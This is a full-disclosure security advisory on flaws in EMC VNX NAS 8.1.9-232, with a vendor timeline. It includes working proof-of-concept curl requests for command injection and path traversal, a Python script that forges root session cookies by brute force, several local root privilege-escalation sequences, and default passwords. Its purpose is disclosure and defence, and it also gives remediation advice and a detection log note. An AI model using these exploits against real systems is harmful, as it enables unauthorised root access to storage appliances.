---
title: Advisory: Multiple vulnerabilities in EMC VNX NAS 8.1.9-232
---

Vulnerabilities Discovered
==========================

Critical: Unauthenticated Remote Code Execution
-----------------------------------------------
The perl module ```/nas/http/scripts/Apache/TicketLogin.pm``` does not sanitize GET user input before passing these parameters to a function that passes a concatenated string to the shell:

```perl
sub handler {
    my($user, $pass, $scope, $ldap, $remember_me) = map { param($_) } qw(user password scope ldap remember_me);
    ...
    ($result, $msg, $user_access) = $ticketTool->authenticate_local_user($user, $pass, $client_type);
}

sub authenticate_local_user {
    my($self, $user, $passwd, $client_type) = @_;
    my $prog = "|/nas/sbin/check_user ";
    $prog = $prog . '"' . $user . '" 1>/dev/null 2>&1';
    open PWAUTH, "$prog";
    ...
}
```

This allows an unauthenticated remote attacker to run arbitrary commands on the server as the ```apache``` user.

Example RCE:
```shell
curl -k -s 'https://xxx/Login?user=user%22||touch%20/var/tmp/rce||%22=&password=error&Login=Login'
```

Results in:
```
[root@xxx /]# ll /var/tmp/
-rw-r--r-- 1 apache apache       0 Sep 22 13:45 rce
```


Unauthenticated Restricted File read/write through path traversal
-----------------------------------------------------------------
The shell script ```/nas/http/bin/link_launch_user_details``` does not sanitize GET user input and notably fails to verify that the supplied file parameter is in the expected directory once the path has been fully resolved:

```sh
temp=$(echo $QUERY_STRING | cut -f2 -d '&')
userName=$(echo $temp | cut -f2 -d '=')

path=$dir/$userName.xml

if [ "$level" = "read" ]; then
    read_file=`cat $path`
elif [ "$level" = "write" ]; then
    echo $data > $path
fi
```

This allows an unauthenticated remote attacker to read any xml file on the file system, and create xml files as user ```nasadmin```. This could potentially lead to an unauthenticated remote code execution.

Example read:
```shell
$ curl -k -s 'https://xxx/cgi-bin/link_launch_user_details?level=read&user=../../http/webui/tools/tomcat/conf/tomcat-users&data=test'
<HTML>
file=<?xml version='1.0' encoding='utf-8'?>
<tomcat-users>
</tomcat-users>
</HTML>
```

Example write:
```shell
$ curl -k -s 'https://xxx/cgi-bin/link_launch_user_details?level=write&user=../../../tmp/test&data=test_test_test_test'
<HTML>
<BODY>
        Done!!!
</BODY>
</HTML>
```

Results in:
```
[root@xxx nas]# ll /tmp/test.xml
-rw-r--r-- 1 nasadmin nasadmin 20 Sep 22 13:22 /tmp/test.xml
[root@xxx nas]# cat /tmp/test.xml
test_test_test_test
```

Critical: Authentication bypass
-------------------------------
A combination of vulnerabilities lets remote unauthenticated attackers authenticate to the webserver as any user by forging a cookie.

The secret value for constructing cookies is a 5 digits number, generated during install and never rotated:
```shell
hexdump -d /dev/urandom | head -1 | awk '{ print $NF }' > $NAS_DB/http/conf/secret.txt
```

The cookie is authenticated by a hash of its values and uses the secret to build said hash:
```perl
my $hash = sha1_hex($secret .
                    sha1_hex(join ':', $secret, $type, $ip_address, $now,
                             $_persists, $expires_when, $last, $user_name));
```

Since the keyspace of the secret value is so small, it is easily recovered offline by anyone in possession of a cookie. This lets users that had any cookie at any point in time create cookies at any time for any users, including users with more privileges.

Worst yet, it's possible to remotely bruteforce the secret value by generating 65k cookies with all possible values. In order to do this, two checks have to be bypassed: the session and timeout checks.
The session check is performed in ```/nas/http/scripts/Apache/SessionTrack.pm```. It verifies whether the ```time``` value of the cookie exists on disk in the ```/nas/http/sessions/``` folder:
```perl
sub validate_session {
   my $sess_file = $ticket{'time'};
   my $full_file_name = $sess_dir . $sess_file;
   if (-e $full_file_name) {
      my ($atime, $mtime) = (stat($full_file_name))[8,9];
      utime(time, $mtime, $full_file_name);
      return (1, 'ok');
   }
}
```

This check can be bypassed with a path traversal, by supplying ```'time'='../logs/access_log'``` which resolves to a path that always exists, thus validating the condition.

The second bypass is the timeout check, performed in ```/nas/http/scripts/Apache//TicketTool.pm```:
```perl
sub check_expiration {
    my $now = time;
    my $issued = $ticket{'time'};
    my $ticket_expires = $ticket{'expires'};

    $expired = ($now - $issued)/60 > $ticket_expires;
    if ($expired) {
        my $exceeded = $ticket_expires/60;
        $msg = "$exceeded hour maximum session time exceeded.";
    }
}
```

I don't really speak perl but it looks like trying to substract a text string from a number string simple causes the result to be the unchanged number string. So supplying an expiration date bigger than ```time``` (which returns the current timestamp) bypasses this check.

Note that if we didn't have these two bypasses, it may still be possible to guess a correct session by monitoring the timings of the server's responses, although the current operation order (hash then filesystem check) may render this attack impractical.

Let's put together the full exploit in python3 for good measure:
```python
#!/usr/bin/env python3
import requests
import hashlib
import sys

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def generate_cookie(secret):
    secret = '{:05}\n'.format(secret)
    ticket_type = 'User'
    ip_address = sys.argv[1]
    now = '../logs/access_log'
    persists = ''
    expires_when = '99999999999999999999999'    # any value > now
    last = now
    user_name = 'root'

    bvalues = ':'.join((secret, ticket_type, ip_address, now, persists, expires_when, last, user_name)).encode('utf-8')
    hash_val = hashlib.sha1((secret + hashlib.sha1(bvalues).hexdigest()).encode('utf-8')).hexdigest()

    return {'Ticket': 'time&{}&ip&{}&last&{}&idle&{}&hash&{}&user&{}&useraccess&{}&type&{}&persists&{}&expires&{}'.format(now, ip_address, last, '', hash_val, user_name, '', ticket_type, persists, expires_when)}


# MAIN #########################################################################
for i in range(0, 65536):
    cookie = generate_cookie(i)
    r = requests.get('https://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/downloadFile', cookies=cookie, verify=False)
    if '<title>Upload file result</title>' in r.text:
        print('Found server secret value: {}'.format(i))
        print('Here\'s your cookie:')
        print(cookie)
        exit(0)

print('Somehow failed to find the secret value')
exit(1)
```

Run the script (172.27.30.174 is my computer's IP, not the server's):
```
    ./vnx_bf_cookie 172.27.30.174
    Found server secret value: 24794
    Here's your cookie:
    {'Ticket': 'time&../logs/access_log&ip&172.27.30.174&last&../logs/access_log&idle&&hash&03d531180624eb033d36dee94d0c0c01a1943306&user&root&useraccess&&type&User&persists&&expires&99999999999999999999999'}

    curl -k -s 'https://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/cgi-bin/runclicmd?command_line=id' --cookie 'Ticket=time&../logs/access_log&ip&172.27.30.174&last&../logs/access_log&idle&&hash&03d531180624eb033d36dee94d0c0c01a1943306&user&root&useraccess&&type&User&persists&&expires&99999999999999999999999'
    uid=0(root) gid=0(root)
    groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

### Blueteam note
The script above will generate thousands of these events in ```/nas/http/logs/ssl_error_log```:
```
[Mon Sep 28 13:45:35 2020] [error] access to /nas/tomcat/webapps/ROOT/downloadFile failed for xx.xx.xx.xx, reason: Message <possibly altered ticket> repeated last 20 times
[Mon Sep 28 13:45:35 2020] [error] access to /nas/tomcat/webapps/ROOT/downloadFile failed for xx.xx.xx.xx, reason: Message <possibly altered ticket> repeated last 20 times
```

Remote code execution as root
-----------------------------
The file ```/nas/http/bin/runclicmd``` checks whether the advertised user is root:
```shell
uid=`id -u 2>/dev/null`
```

If so, he may run any command by skipping all checks:
```shell
if [ $uid != "0" ]
then
    ...
fi

/bin/sh -c "$command_line" 2>&1 | fold -s -$width 2>&1
```

Thus, by faking a root cookie we get a remote code execution:
```
$ curl -k -s 'https://xxx/cgi-bin/runclicmd?command_line=id --cookie='Ticket=time&../logs/access_log&ip&xx.xx.xx.xx&last&../logs/access_log&idle&&hash&xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&user&root&useraccess&&type&User&persists&&expires&99999999999999999999999'
uid=0(root) gid=0(root)
groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```


Remote code execution as unprivileged user by bypassing filters
---------------------------------------------------------------
Still in ```/nas/http/bin/runclicmd```, various checks are performed if the user is anyone but root:
```shell
command_line=$(echo $command_line| tr -d "\n" )
if [ $uid != "0" ]
then
    if echo "$command_line" | grep -q "[\`\;\|\&(<>]"
    then
        echo "$command_line: Special characters (\`;|&(<>) not permitted."
        exit 0
    fi

    # Get command name
    command=`echo $command_line | cut -f1 -d' ' 2>/dev/null`
    base_name=`basename $command`
    if [ "$base_name" != "man" ]
    then
        if [ ! -x "$NAS_DB/bin/$base_name" -a ! -x "$NAS_DB/sbin/$base_name" ]
        then
            echo "$command: command not found."
            exit 0
        fi
    fi
fi
```

There are two checks:

* the command cannot contain any of the ```\`;|&(<>``` characters
    * this means no process substitution (can't do backticks nor ```$()```
    * no additional commands (no newline, `&&`, `||`, ';')
* the string "$NAS_DB/bin/"$(basename $command) must exist on disk


It's possible to bypass both checks by passing ```. script```, where the ```.``` will build a valid path and will afterwards be recognized as ```source```. This is probably exploitable by first uploading an arbitrary script using the ```DownloadFile``` CGI first (untested).


Remote code execution as unprivileged user by injecting variables
-----------------------------------------------------------------
(Credits to Raphael Geissert).

This one executes an arbitrary command by directly injecting variables.

For instance, it's possible to overwrite the ```NAS_DB``` path to any existing path thus calling any existing command:
```
$ curl -k -s 'https://xxx/cgi-bin/runclicmd?NAS_DB=/usr/&command_line=id' --cookie='Ticket=time&../logs/access_log&ip&xx.xx.xx.xx&last&../logs/access_log&idle&&hash&xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&user&nasadmin&useraccess&&type&User&persists&&expires&99999999999999999999999'
uid=201(nasadmin) gid=201(nasadmin) groups=201(nasadmin),504(fullnas)
```

Since there's ```nc``` installed on the appliance, a reverse shell from here is trivially reached.

Note that one may also inject the variable ```$width``` used in command ```| fold -s -$witdh``` to perform an arbitrary file read.



Local Privilege Escalations
---------------------------
### Password in GET request, logged to disk
The authentication perl module ```/nas/http/scripts/Apache/TicketLogin.pm``` is built using a GET request and thus saves the users' names and passwords when logging to disk:

```
[root@xxx]# grep -r password= /nas/http/logs/*_log
/nas/http/logs/access_log:10.140.234.132 - - [22/Sep/2020:07:39:07 +0200] "GET /Login?user=nasadmin&password=xxx&Login=Login HTTP/1.1" 200 469 "-" "Apache-HttpClient/4.3 (java 1.5)"
```

Furthermore, these log files are world-readable, allowing any user to elevate their privileges to the user authenticating (nasadmin in our case):
```
[root@xxx]# ll /nas/http/logs/*_log
-rw-r--r-- 1 root root  114508 Sep 22 11:32 /nas/http/logs/access_log
-rw-r--r-- 1 root root   47045 Sep 22 11:30 /nas/http/logs/error_log
-rw-r--r-- 1 root root       0 Dec 15  2016 /nas/http/logs/rewrite_log
lrwxrwxrwx 1 root root      25 Sep 24  2018 /nas/http/logs/ssl_engine_log -> /nas/http/logs/access_log
-rw-r--r-- 1 root root 1746252 Sep 22 11:32 /nas/http/logs/ssl_error_log
-rw-r--r-- 1 root root   95496 Sep 22 11:32 /nas/http/logs/ssl_request_log
```

### sudo command find (REPORTED BY SOMEONE ELSE AND FIXED IN 8.1.9-236)
The sudo command find defined for users nasadmin, sysadmin and admin users let them elevate their privileges to root by executing an arbitrary command from find:
```
    (root) NOPASSWD: /usr/bin/find
```

Example privesc:
```
[nasadmin@xxx /]$ id
uid=201(nasadmin) gid=201(nasadmin) groups=201(nasadmin),504(fullnas)
[nasadmin@xxx /]$ sudo find / -maxdepth 1 -type d -name tmp -exec /bin/bash -c /bin/bash {} +
[root@xxx /]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

### sudo wildcard
The sudo command ```install_mgr``` containing a path wildcard for users users nasadmin, sysadmin and admin users let them elevate their privileges by creating a directory and executing any binary:
```
    (root) NOPASSWD: /var/tmp/.CUT/CUS*-*-.dir/IMHC.dir/install_mgr, /nas/sbin/nas_connecthome
```

Example privesc:
```
[nasadmin@xxx /]$ mkdir -p /var/tmp/.CUT/CUS1-1-.dir/IMHC.dir/
[nasadmin@xxx /]$ cp /bin/bash /var/tmp/.CUT/CUS1-1-.dir/IMHC.dir/install_mgr
[nasadmin@xxx /]$ sudo /var/tmp/.CUT/CUS1-1-.dir/IMHC.dir/install_mgr
[root@xxx /]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

Note that the /var/tmp/.CUT is world-writeable:
```
ls -lad /var/tmp/.CUT/
drwxrwxrwx 11 sysadmin1 nasadmin 4096 Sep 22 13:06 /var/tmp/.CUT/
```

### sudo binary rights
Some of the commands defined for user nasadmin are owned by nasadmin:
```
-rwxr-x--x 1 nasadmin nasadmin    5578 Jul 12  2018 /nas/sbin/check_workpart_and_log_slice_consistency
-rwxr-x--x 1 nasadmin nasadmin   37609 Jul 12  2018 /nas/sbin/lvm_checkup
-rwxr-xr-x 1 nasadmin nasadmin 9725020 Jul 12  2018 /nas/sbin/nas_connecthome
-rwxr-x--x 1 nasadmin nasadmin  230155 Jul 12  2018 /nas/sbin/setup_slot
-rwxr-x--x 1 nasadmin nasadmin   86981 Jul 12  2018 /nas/sbin/workpart
```

This allows the user nasadmin to become root by replacing these binaries with e.g. a shell such as /bin/bash.

### cron
Some of the cron executed by root are using binaries owned by nasadmin:
```
[root@xxx ~]# grep root /nas/site/cron.d/nas_sys | cut -d' ' -f7 | xargs ls -la | grep -v root
-rwxr-x--x 1 nasadmin nasadmin  6842 Jul 12  2018 /nas/sbin/dskMon
-rwxr-x--x 1 nasadmin nasadmin 53077 Jul 12  2018 /nas/sbin/nas_config
-rwxr-x--x 1 nasadmin nasadmin 36218 Jul 12  2018 /nas/sbin/nasdb_backup
-rwxr-x--x 1 nasadmin nasadmin  1900 Jul 12  2018 /nas/sbin/root_cron
-r-xr-xr-x 1 nasadmin nasadmin  5638 Jul 12  2018 /nas/sbin/syncrep/syncrep_update_netif
-rwxr-x--- 1 nasadmin nasadmin 12236 Jul 12  2018 /nas/sbin/.sync_up_dedup_status
-rwxr-x--x 1 nasadmin nasadmin  1381 Jul 12  2018 /nas/sbin/tomcat_log_aging
-rwxr-x--x 1 nasadmin nasadmin  4968 Jul 12  2018 /nas/sbin/update_cs_ext_ip_to_servers
-rwxr-x--- 1 nasadmin nasadmin  5898 Jul 12  2018 /nas/sbin/.update_pool
```

This allows the user nasadmin to eleveate his privileges to root by overwriting any of these binaries.

### cgi_exec
The setuid binary ```/nas/http/bin/cm/cgi_exec``` does not perform environment sanitation and lets any user becoming root by usurping the ```REMOTE_USER``` and ```NAS_DB``` environement variables.

Example privesc:
```
bash-3.2$ id
uid=48(apache) gid=48(apache) groups=48(apache)

bash-3.2$ pwd
/dev/shm/.a

bash-3.2$ export NAS_DB=/dev/shm/.a/

bash-3.2$ export REMOTE_USER=root

bash-3.2$ ll /nas/http/bin/cm/cgi_exec
-rwsr-sr-x 1 root root 16712 Jul 12  2018 /nas/http/bin/cm/cgi_exec

bash-3.2$ cat ./http/conf/cgi_cmds.cfg
/bin/bash

bash-3.2$ ll ./http/conf/
total 4
drwxr-xr-x 2 apache apache  60 Sep 22 10:15 .
drwxr-xr-x 3 apache apache  60 Sep 22 10:07 ..
-rwxr-xr-x 1 apache apache 101 Sep 22 10:15 cgi_cmds.cfg

bash-3.2$ /nas/http/bin/cm/cgi_exec -d "/bin/bash" "-p"
Adding /bin/bash as item #1
Original user ID is 48
Original user ID is 48
REMOTE_USER=root
REMOTE_GROUP undefined
REMOTE_GROUP now root

bash-3.2# id
uid=48(apache) gid=48(apache) euid=0(root) egid=0(root) groups=48(apache)
```


Takeaways
=========

* validate all user input using a regex or a whitelist
* do not rely on user input when performing shell, database or filesystem operations
* use a substantially bigger (>=64 bits) random value for the secret, and rotate it regularly
* encrypt the whole cookie to prevent tampering
* whenever dealing with authentication, try to perform constant-time operations server-side
* implement a lock-out that lasts minutes for offending IPs


Pentest notes
=============
Getting version number
----------------------

```
curl -k -s 'https://xxx/cgi-bin/get_cmu?level=1'
```

Default passwords
-----------------

```root:nasadmin
nasadmin:nasadmin
sysadmin:sysadmin```

Timeline
========
2020-09-20: discovery
2020-09-22: > first barch of vulnerabilities sent to DELL PSIRT
2020-09-22: < Vendor ACK, cases PSRC-14111, PSRC-14112, PSRC-14113, PSRC-14114, PSRC-14115, PSRC-14116, PSRC-14117 and PSRC-14118 opened
2020-09-28: > more vulnerabilities reported
2020-09-28: < Vendor ACK, cases PSRC-14198, PSRC-14199, PSRC-14200 and PSRC-14201 opened
2020-10-29: < Vendor confirms all vulnerabilities applicable except PSRC-14114 (patched)
2020-12-10: > ask if standard 90 days disclosure will be missed; ask for CVEs to be assigned
2020-12-18: < Vendor replies that fixes will be available Q3 2021; no CVEs assigned yet
2021-06-10: > inform that full disclosure will take place on September 1st, 2021
2021-07-06: < Vendor requests precisions on some of the vulns; Vendor informs that next release is pushed to March 2022
2021-07-07: > answer questions about some of the vulns/scripts
2021-08-23: < Vendor informs that next release is pulled to November 2021
2021-09-01: > ask for CVEs to be assigned (again)
2021-09-02: > FD
